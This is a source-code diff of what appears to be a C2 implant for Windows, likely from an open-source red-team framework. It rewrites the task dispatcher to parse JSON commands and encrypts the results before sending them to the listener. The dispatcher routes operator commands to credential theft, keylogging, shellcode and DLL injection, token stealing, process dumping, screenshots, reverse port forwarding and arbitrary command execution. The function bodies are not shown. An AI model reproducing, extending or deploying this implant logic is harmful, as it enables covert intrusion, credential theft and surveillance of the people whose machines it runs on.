@@ -129,362 +129,235 @@ namespace Handler
         pState->hRequest = resp.hRequest;
 
         pState->wTask = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
+        pState->taskJSON = Parser::ParseTask(pState->wTask);
 
         return TRUE;
     }
 
     BOOL TaskExecute(State::PSTATE pState)
     {
-        std::wstring task = pState->wTask;
+        INT commandCode = pState->taskJSON["command"]["code"];
+        json args = pState->taskJSON["args"];
 
-        if (wcscmp(task.substr(0, 4).c_str(), L"cat ") == 0)
-        {
-            pState->wTaskResult = Task::Cat(task.substr(4, task.size()));
-        }
-        else if (wcscmp(task.substr(0, 3).c_str(), L"cd ") == 0)
-        {
-            pState->wTaskResult = Task::Cd(task.substr(3, task.size()));
-        }
-        else if (wcscmp(task.substr(0, 8).c_str(), L"connect ") == 0)
-        {
-            pState->wTaskResult = Task::Connect(pState, task.substr(8, task.size()));
-        }
-        else if (wcscmp(task.substr(0, 3).c_str(), L"cp ") == 0)
-        {
-            // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() != 3)
-            {
-                return FALSE;
-            }
+        std::wstring wTaskResult;
 
-            pState->wTaskResult = Task::Cp(wArgs[1], wArgs[2]);
-        }
-        else if (wcscmp(task.c_str(), L"creds steal") == 0)
+        switch(commandCode)
         {
-            pState->wTaskResult = Task::CredsSteal();
+            case TASK_CAT:
+                wTaskResult = Task::Cat(Utils::Convert::UTF8Decode(args["path"]));
+                break;
+            case TASK_CD:
+                wTaskResult = Task::Cd(Utils::Convert::UTF8Decode(args["path"]));
+                break;
+            case TASK_CONNECT:
+                wTaskResult = Task::Connect(pState, Utils::Convert::UTF8Decode(args["url"]));
+                break;
+            case TASK_CP:
+                wTaskResult = Task::Cp(
+                    Utils::Convert::UTF8Decode(args["src"]),
+                    Utils::Convert::UTF8Decode(args["dest"])
+                );
+                break;
+            case TASK_CREDS_STEAL:
+                wTaskResult = Task::CredsSteal();
+                break;
+            case TASK_DLL:
+                wTaskResult = Task::Dll(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["pid"]),
+                    Utils::Convert::UTF8Decode(args["dll"])
+                );
+                break;
+            case TASK_DOWNLOAD:
+                wTaskResult = Task::Download(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["src"]),
+                    Utils::Convert::UTF8Decode(args["dest"])
+                );
+                break;
+            case TASK_ENV_LS:
+                wTaskResult = Task::EnvLs();
+                break;
+            case TASK_EXECUTE:
+                wTaskResult = Task::Execute(Utils::Convert::UTF8Decode(args["cmd"]));
+                break;
+            case TASK_GROUP_LS:
+                wTaskResult = Task::GroupLs();
+                break;
+            case TASK_HISTORY:
+                wTaskResult = Task::History();
+                break;
+            case TASK_IP:
+                wTaskResult = Task::Ip();
+                break;
+            case TASK_JITTER:
+                wTaskResult = Task::JitterSet(pState, Utils::Convert::UTF8Decode(args["time"]));
+                break;
+            case TASK_KEYLOG:
+                wTaskResult = Task::KeyLog(Utils::Convert::UTF8Decode(args["time"]));
+                break;
+            case TASK_KILL:
+                wTaskResult = Task::Kill(pState);
+                break;
+            case TASK_KILLDATE:
+                wTaskResult = Task::KillDateSet(pState, Utils::Convert::UTF8Decode(args["datetime"]));
+                break;
+            case TASK_LS:
+                wTaskResult = Task::Ls(Utils::Convert::UTF8Decode(args["path"]));
+                break;
+            case TASK_MIGRATE:
+                wTaskResult = Task::Migrate(Utils::Convert::UTF8Decode(args["pid"]));
+                break;
+            case TASK_MKDIR:
+                wTaskResult = Task::Mkdir(Utils::Convert::UTF8Decode(args["path"]));
+                break;
+            case TASK_MV:
+                wTaskResult = Task::Mv(
+                    Utils::Convert::UTF8Decode(args["src"]),
+                    Utils::Convert::UTF8Decode(args["dest"])
+                );
+                break;
+            case TASK_NET:
+                wTaskResult = Task::Net();
+                break;
+            case TASK_PROCDUMP:
+                wTaskResult = Task::Procdump(pState, Utils::Convert::UTF8Decode(args["pid"]));
+                break;
+            case TASK_PS_KILL:
+                wTaskResult = Task::PsKill(Utils::Convert::UTF8Decode(args["pid"]));
+                break;
+            case TASK_PS_LS:
+                wTaskResult = Task::Ps();
+                break;
+            case TASK_PWD:
+                wTaskResult = Task::Pwd();
+                break;
+            case TASK_REG_SUBKEYS:
+                wTaskResult = Task::RegSubKeys(
+                    Utils::Convert::UTF8Decode(args["rootkey"]),
+                    Utils::Convert::UTF8Decode(args["subkey"]),
+                    Utils::Convert::UTF8Decode(args["recursive"]) == L"true"
+                );
+                break;
+            case TASK_REG_VALUES:
+                wTaskResult = Task::RegValues(
+                    Utils::Convert::UTF8Decode(args["rootkey"]),
+                    Utils::Convert::UTF8Decode(args["subkey"]),
+                    Utils::Convert::UTF8Decode(args["recursive"]) == L"true"
+                );
+                break;
+            case TASK_RM:
+                wTaskResult = Task::Rm(Utils::Convert::UTF8Decode(args["path"]));
+                break;
+            case TASK_RMDIR:
+                wTaskResult = Task::Rmdir(Utils::Convert::UTF8Decode(args["path"]));
+                break;
+            case TASK_RPORTFWD_ADD:
+                wTaskResult = Task::RportfwdAdd(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["lhost"]),
+                    Utils::Convert::UTF8Decode(args["lport"]),
+                    Utils::Convert::UTF8Decode(args["fhost"]),
+                    Utils::Convert::UTF8Decode(args["fport"])
+                );
+                break;
+            case TASK_RPORTFWD_LS:
+                wTaskResult = Task::RportfwdLs(pState);
+                break;
+            case TASK_RPORTFWD_RM:
+                wTaskResult = Task::RportfwdRm(pState);
+                break;
+            case TASK_RUNAS:
+                wTaskResult = Task::RunAs(
+                    Utils::Convert::UTF8Decode(args["username"]),
+                    Utils::Convert::UTF8Decode(args["password"]),
+                    Utils::Convert::UTF8Decode(args["cmd"])
+                );
+                break;
+            case TASK_SCREENSHOT:
+                 // Is DLL implant, the screenshot feature is not available.
+                #ifndef IS_DLL
+                wTaskResult = Task::Screenshot(pState);
+                #else
+                wTaskResult = L"Cannot take a screenshot on DLL";
+                #endif
+                break;
+            case TASK_SHELLCODE:
+                if (args.size() != 2)
+                {
+                    return FALSE;
+                }
+                wTaskResult = Task::Shellcode(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["pid"]),
+                    Utils::Convert::UTF8Decode(args["shellcode"])
+                );
+                break;
+            case TASK_SLEEP:
+                wTaskResult = Task::SleepSet(pState, Utils::Convert::UTF8Decode(args["time"]));
+                break;
+            case TASK_TOKEN_REVERT:
+                wTaskResult = Task::TokenRevert();
+                break;
+            case TASK_TOKEN_STEAL:
+                wTaskResult = Task::TokenSteal(
+                    Utils::Convert::UTF8Decode(args["pid"]),
+                    Utils::Convert::UTF8Decode(args["process"]),
+                    Utils::Convert::UTF8Decode(args["login"]) == L"true"
+                );
+                break;
+            case TASK_UPLOAD:
+                wTaskResult = Task::Upload(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["src"]),
+                    Utils::Convert::UTF8Decode(args["dest"])
+                );
+                break;
+            case TASK_USER_LS:
+                wTaskResult = Task::Users();
+                break;
+            case TASK_WHOAMI:
+                wTaskResult = Task::Whoami();
+                break;
+            case TASK_WHOAMI_PRIV:
+                wTaskResult = Task::WhoamiPriv();
+                break;
+            default:
+                wTaskResult = L"Error: Invalid task.";
         }
-        else if (wcscmp(task.substr(0, 4).c_str(), L"dll ") == 0)
-        {
-            // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() != 3)
-            {
-                return FALSE;
-            }
-            std::wstring wDllSrc;
-            for (size_t i = 2; i < wArgs.size(); i++)
-            {
-                wDllSrc += wArgs[i];
-            }
 
-            pState->wTaskResult = Task::Dll(pState, wArgs[1], wDllSrc);
-        }
-        else if (wcscmp(task.substr(0, 9).c_str(), L"download ") == 0)
-        {
-            // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() != 3)
-            {
-                return FALSE;
-            }
-
-            pState->wTaskResult = Task::Download(pState, wArgs[1], wArgs[2]);
-        }
-        else if (wcscmp(task.c_str(), L"env") == 0)
-        {
-            pState->wTaskResult = Task::EnvLs();
-        }
-        else if (wcscmp(task.substr(0, 8).c_str(), L"execute ") == 0)
-        {
-            pState->wTaskResult = Task::Execute(task.substr(8, task.size()));
-        }
-        else if (wcscmp(task.c_str(), L"groups") == 0)
-        {
-            pState->wTaskResult = Task::Groups();
-        }
-        else if (wcscmp(task.c_str(), L"history") == 0)
-        {
-            pState->wTaskResult = Task::History();
-        }
-        else if (wcscmp(task.c_str(), L"ip") == 0)
-        {
-            pState->wTaskResult = Task::Ip();
-        }
-        else if (wcscmp(task.substr(0, 7).c_str(), L"jitter ") == 0)
-        {
-            pState->wTaskResult = Task::SleepSet(pState, task.substr(7, task.size()));
-        }
-        else if (wcscmp(task.substr(0, 7).c_str(), L"keylog ") == 0)
-        {
-            pState->wTaskResult = Task::KeyLog(task.substr(7, task.size()));
-        }
-        else if (wcscmp(task.c_str(), L"kill") == 0)
-        {
-            pState->wTaskResult = Task::Kill(pState);
-        }
-        else if (wcscmp(task.substr(0, 9).c_str(), L"killdate ") == 0)
-        {
-            pState->wTaskResult = Task::KillDateSet(pState, task.substr(9, task.size()));
-        }
-        else if (wcscmp(task.substr(0, 3).c_str(), L"ls ") == 0)
-        {
-            pState->wTaskResult = Task::Ls(task.substr(3, task.size()));
-        }
-        else if (wcscmp(task.substr(0, 8).c_str(), L"migrate ") == 0)
-        {
-            pState->wTaskResult = Task::Migrate(task.substr(8, task.size()));
-        }
-        else if (wcscmp(task.substr(0, 6).c_str(), L"mkdir ") == 0)
-        {
-            pState->wTaskResult = Task::Mkdir(task.substr(6, task.size()));
-        }
-        else if (wcscmp(task.substr(0, 3).c_str(), L"mv ") == 0)
-        {
-            // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() != 3)
-            {
-                return FALSE;
-            }
-
-            pState->wTaskResult = Task::Mv(wArgs[1], wArgs[2]);
-        }
-        else if (wcscmp(task.c_str(), L"net") == 0)
-        {
-            pState->wTaskResult = Task::Net();
-        }
-        else if (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0)
-        {
-            pState->wTaskResult = Task::Procdump(task.substr(9, task.size()));
-        }
-        else if (wcscmp(task.c_str(), L"ps") == 0)
-        {
-            pState->wTaskResult = Task::Ps();
-        }
-        else if (wcscmp(task.substr(0, 8).c_str(), L"ps kill ") == 0)
-        {
-            pState->wTaskResult = Task::PsKill(task.substr(8, task.size()));
-        }
-        else if (wcscmp(task.c_str(), L"pwd") == 0)
-        {
-            pState->wTaskResult = Task::Pwd();
-        }
-        else if (wcscmp(task.substr(0, 12).c_str(), L"reg subkeys ") == 0)
-        {
-            // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() < 5)
-            {
-                return FALSE;
-            }
-            BOOL bRecurse = wArgs[2] == L"true";
-            std::wstring wRootKey = wArgs[3];
-            std::wstring wSubKey;
-            for (size_t i = 4; i < wArgs.size(); i++)
-            {
-                wSubKey += wArgs[i];
-            }
-
-            pState->wTaskResult = Task::RegSubKeys(wRootKey, wSubKey, bRecurse);
-        }
-        else if (wcscmp(task.substr(0, 11).c_str(), L"reg values ") == 0)
-        {
-            // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() < 5)
-            {
-                return FALSE;
-            }
-            BOOL bRecurse = wArgs[2] == L"true";
-            std::wstring wRootKey = wArgs[3];
-            std::wstring wSubKey;
-            for (size_t i = 4; i < wArgs.size(); i++)
-            {
-                wSubKey += wArgs[i];
-            }
-
-            pState->wTaskResult = Task::RegValues(wRootKey, wSubKey, bRecurse);
-        }
-        else if (wcscmp(task.substr(0, 3).c_str(), L"rm ") == 0)
-        {
-            pState->wTaskResult = Task::Rm(task.substr(3, task.size()));
-        }
-        else if (wcscmp(task.substr(0, 6).c_str(), L"rmdir ") == 0)
-        {
-            pState->wTaskResult = Task::Rmdir(task.substr(6, task.size()));
-        }
-        else if (wcscmp(task.substr(0, 13).c_str(), L"rportfwd add ") == 0)
-        {
-            // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() != 6)
-            {
-                return FALSE;
-            }
-
-            pState->wTaskResult = Task::RportfwdAdd(pState, wArgs[2], wArgs[3], wArgs[4], wArgs[5]);
-        }
-        else if (wcscmp(task.substr(0, 11).c_str(), L"rportfwd ls") == 0)
-        {
-            pState->wTaskResult = Task::RportfwdLs(pState);
-        }
-        else if (wcscmp(task.substr(0, 12).c_str(), L"rportfwd rm ") == 0)
-        {
-            // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() != 4)
-            {
-                return FALSE;
-            }
-
-            pState->wTaskResult = Task::RportfwdRm(wArgs[2], wArgs[3]);
-        }
-        else if (wcscmp(task.substr(0, 6).c_str(), L"runas ") == 0)
-        {
-            // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() < 3)
-            {
-                return FALSE;
-            }
-            std::wstring wUser = wArgs[1];
-            std::wstring wPassword = wArgs[2];
-            std::wstring wCmd;
-            for (size_t i = 3; i < wArgs.size(); i++)
-            {
-                wCmd += wArgs[i];
-            }
-
-            pState->wTaskResult = Task::RunAs(wUser, wPassword, wCmd);
-        }
-        else if (wcscmp(task.c_str(), L"screenshot") == 0)
-        {
-            // Is DLL implant, the screenshot feature is not available.
-            #ifndef IS_DLL
-            pState->wTaskResult = Task::Screenshot(pState);
-            #else
-            pState->wTaskResult = L"Cannot take a screenshot on DLL";
-            #endif
-        }
-        else if (wcscmp(task.substr(0, 10).c_str(), L"shellcode ") == 0)
-        {
-            // Parse arguments
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() != 3)
-            {
-                return FALSE;
-            }
-            std::wstring wPid = wArgs[1];
-            std::wstring wSrc;
-            for (size_t i = 2; i < wArgs.size(); i++)
-            {
-                wSrc += wArgs[i];
-            }
-
-            pState->wTaskResult = Task::Shellcode(pState, wArgs[1], wSrc);
-        }
-        else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
-        {
-            pState->wTaskResult = Task::SleepSet(pState, task.substr(6, task.size()));
-        }
-        else if (wcscmp(task.c_str(), L"token revert") == 0)
-        {
-            pState->wTaskResult = Task::TokenRevert();
-        }
-        else if (wcscmp(task.substr(0, 12).c_str(), L"token steal ") == 0)
-        {
-            // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() != 4)
-            {
-                return FALSE;
-            }
-
-            pState->wTaskResult = Task::TokenSteal(wArgs[2], wArgs[3]);
-        }
-        else if (wcscmp(task.substr(0, 7).c_str(), L"upload ") == 0)
-        {
-            // Parse arguments.
-            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
-            if (wArgs.size() != 3)
-            {
-                return FALSE;
-            }
-
-            pState->wTaskResult = Task::Upload(pState, wArgs[1], wArgs[2]);
-        }
-        else if (wcscmp(task.c_str(), L"users") == 0)
-        {
-            pState->wTaskResult = Task::Users();
-        }
-        else if (wcscmp(task.c_str(), L"whoami") == 0)
-        {
-            pState->wTaskResult = Task::Whoami();
-        }
-        else if (wcscmp(task.c_str(), L"whoami priv") == 0)
-        {
-            pState->wTaskResult = Task::WhoamiPriv();
-        }
-        else
-        {
-            pState->wTaskResult = L"Error: Invalid task.";
-        }
+        // Convert the result to JSON
+        json resultJSON;
+        resultJSON["task"]["command"] = pState->taskJSON["command"];
+        resultJSON["task"]["args"] = pState->taskJSON["args"];
+        resultJSON["result"] = Utils::Convert::UTF8Encode(wTaskResult);
+        pState->taskResultJSON = resultJSON;
 
         return TRUE;
     }
 
     BOOL TaskResultSend(State::PSTATE pState)
     {
-        System::Http::WinHttpResponse resp;
-
         // Prepare additional headers
         std::wstring wHeaders;
         wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n" + L"X-Task: " + pState->wTask + L"\r\n";
 
-        // When the "procdump" and "screenshot" tasks,
-        // read bytes of the captured image file and send them.
-        if (
-            (wcscmp(pState->wTask.substr(0, 9).c_str(), L"procdump ") == 0) ||
-            (wcscmp(pState->wTask.c_str(), L"screenshot") == 0)
-        ) {
-            std::wstring wFilePath = pState->wTaskResult;
+        // Encrypt task result
+        std::wstring wEncResult = Crypt::Encrypt(Utils::Convert::UTF8Decode(pState->taskResultJSON.dump()));
+        // I couln't retrieve the `wstring` length correctly, so use `string` here.
+        std::string sEncResult = Utils::Convert::UTF8Encode(wEncResult);
 
-            // Read file data
-            std::vector<char> fileData = System::Fs::ReadBytesFromFile(wFilePath);
-
-            // Delete file
-            DeleteFile(wFilePath.c_str());
-
-            resp = System::Http::SendRequest(
-                pState->pProcs,
-                pState->hConnect,
-                pState->lpListenerHost,
-                pState->nListenerPort,
-                pState->lpReqPathTaskResult,
-                L"POST",
-                wHeaders.c_str(),
-                (LPVOID)fileData.data(),
-                (DWORD)fileData.size()
-            );
-        }
-        else
-        {
-            // I couln't retrieve the `wstring` length correctly, so use `string` here.
-            std::string sTaskResult = Utils::Convert::UTF8Encode(pState->wTaskResult);
-
-            resp = System::Http::SendRequest(
-                pState->pProcs,
-                pState->hConnect,
-                pState->lpListenerHost,
-                pState->nListenerPort,
-                pState->lpReqPathTaskResult,
-                L"POST",
-                wHeaders.c_str(),
-                (LPVOID)sTaskResult.c_str(),
-                (DWORD)strlen(sTaskResult.c_str())
-            );
-        }
+        System::Http::WinHttpResponse resp = System::Http::SendRequest(
+            pState->pProcs,
+            pState->hConnect,
+            pState->lpListenerHost,
+            pState->nListenerPort,
+            pState->lpReqPathTaskResult,
+            L"POST",
+            wHeaders.c_str(),
+            (LPVOID)sEncResult.c_str(),
+            (DWORD)strlen(sEncResult.c_str())
+        );
 
         if (!resp.bResult || resp.dwStatusCode != 200)
         {
